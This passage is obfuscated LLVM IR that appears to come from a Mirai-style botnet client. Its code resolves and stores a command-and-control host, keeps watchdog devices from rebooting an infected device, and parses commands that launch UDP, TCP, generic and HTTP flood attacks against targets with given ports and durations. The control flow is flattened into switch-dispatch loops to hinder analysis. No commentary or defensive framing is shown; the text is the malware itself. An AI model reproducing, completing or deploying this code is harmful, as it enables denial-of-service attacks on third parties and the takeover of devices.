; <label>:15:                                     ; preds = %loopEntry
  %16 = load %struct.in_addr**, %struct.in_addr*** %3, align 8
  %17 = load i32, i32* %4, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds %struct.in_addr*, %struct.in_addr** %16, i64 %18
  %20 = load %struct.in_addr*, %struct.in_addr** %19, align 8
  %21 = icmp ne %struct.in_addr* %20, null
  %22 = select i1 %21, i32 127264362, i32 992731619
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load %struct.in_addr**, %struct.in_addr*** %3, align 8
  %25 = load i32, i32* %4, align 4
  %26 = sext i32 %25 to i64
  %27 = getelementptr inbounds %struct.in_addr*, %struct.in_addr** %24, i64 %26
  %28 = load %struct.in_addr*, %struct.in_addr** %27, align 8
  %29 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %28, i32 0, i32 0
  %30 = load i32, i32* %29, align 4
  %31 = call i8* @inet_ntoa(i32 %30) #6
  %32 = call i8* @strcpy(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @c2_host, i32 0, i32 0), i8* %31) #6
  store i32 0, i32* %1, align 4
  store i32 -336233537, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i32, i32* %4, align 4
  %35 = add nsw i32 %34, 1
  store i32 %35, i32* %4, align 4
  store i32 -2010075920, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  store i32 1, i32* %1, align 4
  store i32 -336233537, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %1, align 4
  ret i32 %38

loopEnd:                                          ; preds = %36, %33, %23, %15, %10, %9, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #2

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @watchdog_maintain() #0 {
  %.reg2mem = alloca i32
  %1 = alloca [7 x i32], align 16
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = bitcast [7 x i32]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 28, i32 16, i1 false)
  store i32 1, i32* %2, align 4
  store i32 0, i32* %3, align 4
  call void @table_unlock_val(i8 zeroext 1)
  call void @table_unlock_val(i8 zeroext 2)
  call void @table_unlock_val(i8 zeroext 3)
  call void @table_unlock_val(i8 zeroext 4)
  call void @table_unlock_val(i8 zeroext 5)
  call void @table_unlock_val(i8 zeroext 6)
  call void @table_unlock_val(i8 zeroext 7)
  %5 = call i8* @table_retrieve_val(i32 1, i32* null)
  %6 = call i32 (i8*, i32, ...) @open(i8* %5, i32 2)
  store i32 %6, i32* %.reg2mem
  %7 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 0
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %7, align 16
  %switchVar = alloca i32
  store i32 -637237943, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -637237943, label %first
    i32 -1247159260, label %10
    i32 -1409912608, label %16
    i32 2061659439, label %22
    i32 340740696, label %28
    i32 -1143086786, label %34
    i32 1421259266, label %40
    i32 -232905495, label %46
    i32 726003076, label %68
    i32 2118335537, label %72
    i32 -1477371914, label %73
    i32 1218373434, label %96
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %8 = icmp ne i32 %.reload, -1
  %9 = select i1 %8, i32 -232905495, i32 -1247159260
  store i32 %9, i32* %switchVar
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = call i8* @table_retrieve_val(i32 2, i32* null)
  %12 = call i32 (i8*, i32, ...) @open(i8* %11, i32 2)
  %13 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 1
  store i32 %12, i32* %13, align 4
  %14 = icmp ne i32 %12, -1
  %15 = select i1 %14, i32 -232905495, i32 -1409912608
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = call i8* @table_retrieve_val(i32 3, i32* null)
  %18 = call i32 (i8*, i32, ...) @open(i8* %17, i32 2)
  %19 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 2
  store i32 %18, i32* %19, align 8
  %20 = icmp ne i32 %18, -1
  %21 = select i1 %20, i32 -232905495, i32 2061659439
  store i32 %21, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %23 = call i8* @table_retrieve_val(i32 4, i32* null)
  %24 = call i32 (i8*, i32, ...) @open(i8* %23, i32 2)
  %25 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 3
  store i32 %24, i32* %25, align 4
  %26 = icmp ne i32 %24, -1
  %27 = select i1 %26, i32 -232905495, i32 340740696
  store i32 %27, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  %29 = call i8* @table_retrieve_val(i32 5, i32* null)
  %30 = call i32 (i8*, i32, ...) @open(i8* %29, i32 2)
  %31 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 4
  store i32 %30, i32* %31, align 16
  %32 = icmp ne i32 %30, -1
  %33 = select i1 %32, i32 -232905495, i32 -1143086786
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  %35 = call i8* @table_retrieve_val(i32 6, i32* null)
  %36 = call i32 (i8*, i32, ...) @open(i8* %35, i32 2)
  %37 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 5
  store i32 %36, i32* %37, align 4
  %38 = icmp ne i32 %36, -1
  %39 = select i1 %38, i32 -232905495, i32 1421259266
  store i32 %39, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = call i8* @table_retrieve_val(i32 7, i32* null)
  %42 = call i32 (i8*, i32, ...) @open(i8* %41, i32 2)
  %43 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 6
  store i32 %42, i32* %43, align 8
  %44 = icmp ne i32 %42, -1
  %45 = select i1 %44, i32 -232905495, i32 726003076
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 1, i32* %3, align 4
  %47 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 0
  %48 = load i32, i32* %47, align 16
  %49 = call i32 (i32, i64, ...) @ioctl(i32 %48, i64 2147768068, i32* %2) #6
  %50 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 1
  %51 = load i32, i32* %50, align 4
  %52 = call i32 (i32, i64, ...) @ioctl(i32 %51, i64 2147768068, i32* %2) #6
  %53 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 2
  %54 = load i32, i32* %53, align 8
  %55 = call i32 (i32, i64, ...) @ioctl(i32 %54, i64 2147768068, i32* %2) #6
  %56 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 3
  %57 = load i32, i32* %56, align 4
  %58 = call i32 (i32, i64, ...) @ioctl(i32 %57, i64 2147768068, i32* %2) #6
  %59 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 4
  %60 = load i32, i32* %59, align 16
  %61 = call i32 (i32, i64, ...) @ioctl(i32 %60, i64 2147768068, i32* %2) #6
  %62 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 5
  %63 = load i32, i32* %62, align 4
  %64 = call i32 (i32, i64, ...) @ioctl(i32 %63, i64 2147768068, i32* %2) #6
  %65 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 6
  %66 = load i32, i32* %65, align 8
  %67 = call i32 (i32, i64, ...) @ioctl(i32 %66, i64 2147768068, i32* %2) #6
  store i32 726003076, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i32, i32* %3, align 4
  %70 = icmp ne i32 %69, 0
  %71 = select i1 %70, i32 2118335537, i32 1218373434
  store i32 %71, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  store i32 -1477371914, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 0
  %75 = load i32, i32* %74, align 16
  %76 = call i32 (i32, i64, ...) @ioctl(i32 %75, i64 2147768069, i32 0) #6
  %77 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 1
  %78 = load i32, i32* %77, align 4
  %79 = call i32 (i32, i64, ...) @ioctl(i32 %78, i64 2147768069, i32 0) #6
  %80 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 2
  %81 = load i32, i32* %80, align 8
  %82 = call i32 (i32, i64, ...) @ioctl(i32 %81, i64 2147768069, i32 0) #6
  %83 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 3
  %84 = load i32, i32* %83, align 4
  %85 = call i32 (i32, i64, ...) @ioctl(i32 %84, i64 2147768069, i32 0) #6
  %86 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 4
  %87 = load i32, i32* %86, align 16
  %88 = call i32 (i32, i64, ...) @ioctl(i32 %87, i64 2147768069, i32 0) #6
  %89 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 5
  %90 = load i32, i32* %89, align 4
  %91 = call i32 (i32, i64, ...) @ioctl(i32 %90, i64 2147768069, i32 0) #6
  %92 = getelementptr inbounds [7 x i32], [7 x i32]* %1, i64 0, i64 6
  %93 = load i32, i32* %92, align 8
  %94 = call i32 (i32, i64, ...) @ioctl(i32 %93, i64 2147768069, i32 0) #6
  %95 = call i32 @sleep(i32 3)
  store i32 -1477371914, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  call void @table_lock_val(i8 zeroext 1)
  call void @table_lock_val(i8 zeroext 2)
  call void @table_lock_val(i8 zeroext 3)
  call void @table_lock_val(i8 zeroext 4)
  call void @table_lock_val(i8 zeroext 5)
  call void @table_lock_val(i8 zeroext 6)
  call void @table_lock_val(i8 zeroext 7)
  ret void

loopEnd:                                          ; preds = %73, %72, %68, %46, %40, %34, %28, %22, %16, %10, %first, %switchDefault
  br label %loopEntry
}

declare i32 @open(i8*, i32, ...) #5

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #2

declare i32 @sleep(i32) #5

; Function Attrs: noinline nounwind uwtable
define void @proc_cmd(i32, i8**) #0 {
  %.reg2mem = alloca i8*
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %5 = load i8**, i8*** %4, align 8
  %6 = getelementptr inbounds i8*, i8** %5, i64 0
  %7 = load i8*, i8** %6, align 8
  %8 = call i8* @strstr(i8* %7, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.56, i32 0, i32 0)) #10
  store i8* %8, i8** %.reg2mem
  %switchVar = alloca i32
  store i32 1865310767, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1865310767, label %first
    i32 2136129505, label %11
    i32 1923251640, label %18
    i32 1053292980, label %25
    i32 -1668381173, label %32
    i32 2131027733, label %33
    i32 1876470793, label %40
    i32 1076152306, label %47
    i32 -1732559706, label %51
    i32 -1185514899, label %55
    i32 -239243084, label %56
    i32 1006527762, label %60
    i32 -636369802, label %61
    i32 -1092342198, label %77
    i32 -1697394226, label %84
    i32 -1563843880, label %91
    i32 -663517921, label %95
    i32 251647046, label %99
    i32 -1003105445, label %100
    i32 -1805280993, label %104
    i32 -1759754388, label %105
    i32 -399260287, label %124
    i32 -1088464663, label %131
    i32 2127018341, label %138
    i32 -735508126, label %142
    i32 417102651, label %146
    i32 -1954138526, label %147
    i32 -1195566354, label %151
    i32 -974354486, label %152
    i32 1748600080, label %168
    i32 -576448335, label %175
    i32 -1038544710, label %182
    i32 19387120, label %186
    i32 -255524691, label %190
    i32 1784775623, label %191
    i32 101596256, label %195
    i32 1391399606, label %196
    i32 -107053831, label %219
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8*, i8** %.reg2mem
  %9 = icmp ne i8* %.reload, null
  %10 = select i1 %9, i32 -1668381173, i32 2136129505
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i8**, i8*** %4, align 8
  %13 = getelementptr inbounds i8*, i8** %12, i64 0
  %14 = load i8*, i8** %13, align 8
  %15 = call i8* @strstr(i8* %14, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i32 0, i32 0)) #10
  %16 = icmp ne i8* %15, null
  %17 = select i1 %16, i32 -1668381173, i32 1923251640
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8**, i8*** %4, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i8* @strstr(i8* %21, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.58, i32 0, i32 0)) #10
  %23 = icmp ne i8* %22, null
  %24 = select i1 %23, i32 -1668381173, i32 1053292980
  store i32 %24, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i8**, i8*** %4, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 0
  %28 = load i8*, i8** %27, align 8
  %29 = call i8* @strstr(i8* %28, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.59, i32 0, i32 0)) #10
  %30 = icmp ne i8* %29, null
  %31 = select i1 %30, i32 -1668381173, i32 2131027733
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  call void @stop_attack()
  store i32 2131027733, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i8**, i8*** %4, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 0
  %36 = load i8*, i8** %35, align 8
  %37 = call i8* @strstr(i8* %36, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.60, i32 0, i32 0)) #10
  %38 = icmp ne i8* %37, null
  %39 = select i1 %38, i32 1076152306, i32 1876470793
  store i32 %39, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8**, i8*** %4, align 8
  %42 = getelementptr inbounds i8*, i8** %41, i64 0
  %43 = load i8*, i8** %42, align 8
  %44 = call i8* @strstr(i8* %43, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.61, i32 0, i32 0)) #10
  %45 = icmp ne i8* %44, null
  %46 = select i1 %45, i32 1076152306, i32 -1092342198
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load i32, i32* %3, align 4
  %49 = icmp slt i32 %48, 5
  %50 = select i1 %49, i32 -1185514899, i32 -1732559706
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  %52 = load i32, i32* %3, align 4
  %53 = icmp sgt i32 %52, 5
  %54 = select i1 %53, i32 -1185514899, i32 -239243084
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  store i32 -107053831, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = call i32 @listFork()
  %58 = icmp ne i32 %57, 0
  %59 = select i1 %58, i32 1006527762, i32 -636369802
  store i32 %59, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  store i32 -107053831, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i8**, i8*** %4, align 8
  %63 = getelementptr inbounds i8*, i8** %62, i64 1
  %64 = load i8*, i8** %63, align 8
  %65 = load i8**, i8*** %4, align 8
  %66 = getelementptr inbounds i8*, i8** %65, i64 2
  %67 = load i8*, i8** %66, align 8
  %68 = call i32 @atoi(i8* %67) #10
  %69 = load i8**, i8*** %4, align 8
  %70 = getelementptr inbounds i8*, i8** %69, i64 3
  %71 = load i8*, i8** %70, align 8
  %72 = call i32 @atoi(i8* %71) #10
  %73 = load i8**, i8*** %4, align 8
  %74 = getelementptr inbounds i8*, i8** %73, i64 4
  %75 = load i8*, i8** %74, align 8
  %76 = call i32 @atoi(i8* %75) #10
  call void @udpflood(i8* %64, i32 %68, i32 %72, i32 %76)
  store i32 -1092342198, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  %78 = load i8**, i8*** %4, align 8
  %79 = getelementptr inbounds i8*, i8** %78, i64 0
  %80 = load i8*, i8** %79, align 8
  %81 = call i8* @strstr(i8* %80, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.62, i32 0, i32 0)) #10
  %82 = icmp ne i8* %81, null
  %83 = select i1 %82, i32 -1563843880, i32 -1697394226
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i8**, i8*** %4, align 8
  %86 = getelementptr inbounds i8*, i8** %85, i64 0
  %87 = load i8*, i8** %86, align 8
  %88 = call i8* @strstr(i8* %87, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.63, i32 0, i32 0)) #10
  %89 = icmp ne i8* %88, null
  %90 = select i1 %89, i32 -1563843880, i32 -399260287
  store i32 %90, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* %3, align 4
  %93 = icmp slt i32 %92, 6
  %94 = select i1 %93, i32 251647046, i32 -663517921
  store i32 %94, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  %96 = load i32, i32* %3, align 4
  %97 = icmp sgt i32 %96, 6
  %98 = select i1 %97, i32 251647046, i32 -1003105445
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  store i32 -107053831, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  %101 = call i32 @listFork()
  %102 = icmp ne i32 %101, 0
  %103 = select i1 %102, i32 -1805280993, i32 -1759754388
  store i32 %103, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  store i32 -107053831, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i8**, i8*** %4, align 8
  %107 = getelementptr inbounds i8*, i8** %106, i64 1
  %108 = load i8*, i8** %107, align 8
  %109 = load i8**, i8*** %4, align 8
  %110 = getelementptr inbounds i8*, i8** %109, i64 2
  %111 = load i8*, i8** %110, align 8
  %112 = call i32 @atoi(i8* %111) #10
  %113 = load i8**, i8*** %4, align 8
  %114 = getelementptr inbounds i8*, i8** %113, i64 3
  %115 = load i8*, i8** %114, align 8
  %116 = call i32 @atoi(i8* %115) #10
  %117 = load i8**, i8*** %4, align 8
  %118 = getelementptr inbounds i8*, i8** %117, i64 4
  %119 = load i8*, i8** %118, align 8
  %120 = call i32 @atoi(i8* %119) #10
  %121 = load i8**, i8*** %4, align 8
  %122 = getelementptr inbounds i8*, i8** %121, i64 5
  %123 = load i8*, i8** %122, align 8
  call void @tcpflood(i8* %108, i32 %112, i32 %116, i32 %120, i8* %123)
  store i32 -399260287, i32* %switchVar
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  %125 = load i8**, i8*** %4, align 8
  %126 = getelementptr inbounds i8*, i8** %125, i64 0
  %127 = load i8*, i8** %126, align 8
  %128 = call i8* @strstr(i8* %127, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.64, i32 0, i32 0)) #10
  %129 = icmp ne i8* %128, null
  %130 = select i1 %129, i32 2127018341, i32 -1088464663
  store i32 %130, i32* %switchVar
  br label %loopEnd

; <label>:131:                                    ; preds = %loopEntry
  %132 = load i8**, i8*** %4, align 8
  %133 = getelementptr inbounds i8*, i8** %132, i64 0
  %134 = load i8*, i8** %133, align 8
  %135 = call i8* @strstr(i8* %134, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0)) #10
  %136 = icmp ne i8* %135, null
  %137 = select i1 %136, i32 2127018341, i32 1748600080
  store i32 %137, i32* %switchVar
  br label %loopEnd

; <label>:138:                                    ; preds = %loopEntry
  %139 = load i32, i32* %3, align 4
  %140 = icmp slt i32 %139, 5
  %141 = select i1 %140, i32 417102651, i32 -735508126
  store i32 %141, i32* %switchVar
  br label %loopEnd

; <label>:142:                                    ; preds = %loopEntry
  %143 = load i32, i32* %3, align 4
  %144 = icmp sgt i32 %143, 5
  %145 = select i1 %144, i32 417102651, i32 -1954138526
  store i32 %145, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  store i32 -107053831, i32* %switchVar
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  %148 = call i32 @listFork()
  %149 = icmp ne i32 %148, 0
  %150 = select i1 %149, i32 -1195566354, i32 -974354486
  store i32 %150, i32* %switchVar
  br label %loopEnd

; <label>:151:                                    ; preds = %loopEntry
  store i32 -107053831, i32* %switchVar
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  %153 = load i8**, i8*** %4, align 8
  %154 = getelementptr inbounds i8*, i8** %153, i64 1
  %155 = load i8*, i8** %154, align 8
  %156 = load i8**, i8*** %4, align 8
  %157 = getelementptr inbounds i8*, i8** %156, i64 2
  %158 = load i8*, i8** %157, align 8
  %159 = call i32 @atoi(i8* %158) #10
  %160 = load i8**, i8*** %4, align 8
  %161 = getelementptr inbounds i8*, i8** %160, i64 3
  %162 = load i8*, i8** %161, align 8
  %163 = call i32 @atoi(i8* %162) #10
  %164 = load i8**, i8*** %4, align 8
  %165 = getelementptr inbounds i8*, i8** %164, i64 4
  %166 = load i8*, i8** %165, align 8
  %167 = call i32 @atoi(i8* %166) #10
  call void @stdflood(i8* %155, i32 %159, i32 %163, i32 %167)
  store i32 1748600080, i32* %switchVar
  br label %loopEnd

; <label>:168:                                    ; preds = %loopEntry
  %169 = load i8**, i8*** %4, align 8
  %170 = getelementptr inbounds i8*, i8** %169, i64 0
  %171 = load i8*, i8** %170, align 8
  %172 = call i8* @strstr(i8* %171, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.66, i32 0, i32 0)) #10
  %173 = icmp ne i8* %172, null
  %174 = select i1 %173, i32 -1038544710, i32 -576448335
  store i32 %174, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  %176 = load i8**, i8*** %4, align 8
  %177 = getelementptr inbounds i8*, i8** %176, i64 0
  %178 = load i8*, i8** %177, align 8
  %179 = call i8* @strstr(i8* %178, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.67, i32 0, i32 0)) #10
  %180 = icmp ne i8* %179, null
  %181 = select i1 %180, i32 -1038544710, i32 -107053831
  store i32 %181, i32* %switchVar
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %183 = load i32, i32* %3, align 4
  %184 = icmp slt i32 %183, 7
  %185 = select i1 %184, i32 -255524691, i32 19387120
  store i32 %185, i32* %switchVar
  br label %loopEnd

; <label>:186:                                    ; preds = %loopEntry
  %187 = load i32, i32* %3, align 4
  %188 = icmp sgt i32 %187, 7
  %189 = select i1 %188, i32 -255524691, i32 1784775623
  store i32 %189, i32* %switchVar
  br label %loopEnd

; <label>:190:                                    ; preds = %loopEntry
  store i32 -107053831, i32* %switchVar
  br label %loopEnd

; <label>:191:                                    ; preds = %loopEntry
  %192 = call i32 @listFork()
  %193 = icmp ne i32 %192, 0
  %194 = select i1 %193, i32 101596256, i32 1391399606
  store i32 %194, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  store i32 -107053831, i32* %switchVar
  br label %loopEnd

; <label>:196:                                    ; preds = %loopEntry
  %197 = load i8**, i8*** %4, align 8
  %198 = getelementptr inbounds i8*, i8** %197, i64 1
  %199 = load i8*, i8** %198, align 8
  %200 = load i8**, i8*** %4, align 8
  %201 = getelementptr inbounds i8*, i8** %200, i64 2
  %202 = load i8*, i8** %201, align 8
  %203 = load i8**, i8*** %4, align 8
  %204 = getelementptr inbounds i8*, i8** %203, i64 3
  %205 = load i8*, i8** %204, align 8
  %206 = call i32 @atoi(i8* %205) #10
  %207 = trunc i32 %206 to i16
  %208 = load i8**, i8*** %4, align 8
  %209 = getelementptr inbounds i8*, i8** %208, i64 4
  %210 = load i8*, i8** %209, align 8
  %211 = load i8**, i8*** %4, align 8
  %212 = getelementptr inbounds i8*, i8** %211, i64 5
  %213 = load i8*, i8** %212, align 8
  %214 = call i32 @atoi(i8* %213) #10
  %215 = load i8**, i8*** %4, align 8
  %216 = getelementptr inbounds i8*, i8** %215, i64 6
  %217 = load i8*, i8** %216, align 8
  %218 = call i32 @atoi(i8* %217) #10
  call void @httpflood(i8* %199, i8* %202, i16 zeroext %207, i8* %210, i32 %214, i32 %218)
  store i32 -107053831, i32* %switchVar
  br label %loopEnd

; <label>:219:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %196, %195, %191, %190, %186, %182, %175, %168, %152, %151, %147, %146, %142, %138, %131, %124, %105, %104, %100, %99, %95, %91, %84, %77, %61, %60, %56, %55, %51, %47, %40, %33, %32, %25, %18, %11, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #4

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @parse_buffer(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [11 x i8*], align 16
  %6 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %7 = bitcast [11 x i8*]* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* %7, i8 0, i64 88, i32 16, i1 false)
  %8 = load i8*, i8** %2, align 8
  %9 = call i8* @strtok(i8* %8, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0)) #6
  store i8* %9, i8** %6, align 8
  %switchVar = alloca i32
  store i32 -1459268859, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1459268859, label %10
    i32 176175828, label %14
    i32 -363284440, label %17
    i32 -932847609, label %19
    i32 2101779256, label %36
    i32 -1931332455, label %40
    i32 -400550247, label %43
    i32 -486580096, label %44
    i32 1579015154, label %49
    i32 702548811, label %54
    i32 -1904668589, label %57
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i8*, i8** %6, align 8
  %12 = icmp ne i8* %11, null
  %13 = select i1 %12, i32 176175828, i32 -363284440
  store i32 %13, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i32, i32* %4, align 4
  %16 = icmp slt i32 %15, 10
  store i32 -363284440, i32* %switchVar
  store i1 %16, i1* %.reg2mem
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %18 = select i1 %.reload, i32 -932847609, i32 2101779256
  store i32 %18, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = add i64 %21, 1
  %23 = call noalias i8* @malloc(i64 %22) #6
  %24 = load i32, i32* %4, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %4, align 4
  %26 = sext i32 %24 to i64
  %27 = getelementptr inbounds [11 x i8*], [11 x i8*]* %5, i64 0, i64 %26
  store i8* %23, i8** %27, align 8
  %28 = load i32, i32* %4, align 4
  %29 = sub nsw i32 %28, 1
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [11 x i8*], [11 x i8*]* %5, i64 0, i64 %30
  %32 = load i8*, i8** %31, align 8
  %33 = load i8*, i8** %6, align 8
  %34 = call i8* @strcpy(i8* %32, i8* %33) #6
  %35 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0)) #6
  store i8* %35, i8** %6, align 8
  store i32 -1459268859, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %4, align 4
  %38 = icmp sgt i32 %37, 0
  %39 = select i1 %38, i32 -1931332455, i32 -400550247
  store i32 %39, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %4, align 4
  %42 = getelementptr inbounds [11 x i8*], [11 x i8*]* %5, i32 0, i32 0
  call void @proc_cmd(i32 %41, i8** %42)
  store i32 -400550247, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 -486580096, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i32, i32* %3, align 4
  %46 = load i32, i32* %4, align 4
  %47 = icmp slt i32 %45, %46
